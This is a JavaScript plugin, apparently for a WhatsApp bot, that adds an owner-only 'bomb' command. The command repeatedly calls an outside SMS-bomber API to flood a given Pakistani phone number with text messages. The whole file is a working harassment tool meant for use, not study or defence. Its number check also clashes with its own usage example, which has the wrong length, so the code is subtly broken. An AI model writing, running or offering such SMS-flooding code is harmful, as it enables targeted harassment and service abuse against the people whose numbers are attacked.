const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP if already running
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // Extract Number (support both .bomb and !bomb)
    const prefix = text.startsWith('.') ? '.' : '!'; // Detect prefix
    const args = text.slice(1).trim().split(' '); // Remove prefix
    const number = args[0]?.replace(/[^0-9]/g, '');

    // Validate Number
    if (!number || !number.startsWith('92') || number.length !== 11) {
        return reply(`❌ Invalid PK number! Usage: ${prefix}bomb 923001234567`);
    }

    // Start Bombing
    isBombing = true;
    let sent = 0;
    reply(`💣 *Bombing Started!*\nNumber: ${number}`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sent >= 10) { // Max 10 SMS
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`✅ Sent ${sent} SMS!`);
            return;
        }

        try {
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
            const response = await fetch(apiUrl);
            console.log("API Response:", response.status); // Debugging
            
            if (!response.ok) throw new Error(`API Error: ${response.status}`);
            sent++;
            
        } catch (err) {
            console.error("Error:", err);
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`❌ Failed: ${err.message}`);
        }
    }, 3000); // 3-second delay
});
